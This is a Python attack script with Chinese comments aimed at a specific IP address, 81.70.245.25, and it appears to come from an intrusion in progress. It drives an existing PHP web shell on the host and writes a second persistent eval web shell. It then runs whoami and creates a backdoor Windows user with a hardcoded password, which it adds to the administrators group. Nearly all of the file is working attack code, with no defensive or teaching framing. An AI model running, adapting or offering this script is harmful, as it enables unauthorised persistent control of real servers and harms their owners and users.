#!/usr/bin/env python3
"""81.70.245.25 持久化"""
import urllib.request, ssl, sys, urllib.parse

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
B = "http://81.70.245.25"

def exec_cmd(cmd, shell="x.php"):
    data = urllib.parse.urlencode({"x": cmd}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(f"{B}/{shell}", data=data), timeout=15, context=ctx)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:50]}"

# 1. 写稳定shell
php = "<?php @eval($_POST[x]);?>"
r = exec_cmd(f"file_put_contents('C:/phpStudy/WWW/ys.php', '{php}'); echo 'W1';")
print("写ys.php:", r[-50:], flush=True)

# 2. 验证ys.php
try:
    data = urllib.parse.urlencode({"x":"echo STABLE_OK;"}).encode()
    r = urllib.request.urlopen(urllib.request.Request(f"{B}/ys.php", data=data), timeout=10, context=ctx)
    print("ys.php验证:", "STABLE_OK" in r.read().decode(), flush=True)
except Exception as e:
    print("ys.php ERR:", str(e)[:50], flush=True)

# 3. whoami
r = exec_cmd("system('whoami');")
import re
m = re.findall(r"[\w\-]+\\[\w\-]+", r)
print("whoami:", m[:2], flush=True)

# 4. 加后门用户
r = exec_cmd("system('net user hermes Admin888! /add');")
print("加用户:", "成功" if "success" in r.lower() or "1115" not in r else r[-30:], flush=True)
r = exec_cmd("system('net localgroup administrators hermes /add');")
print("加管理员:", "ok" if r else "?", flush=True)
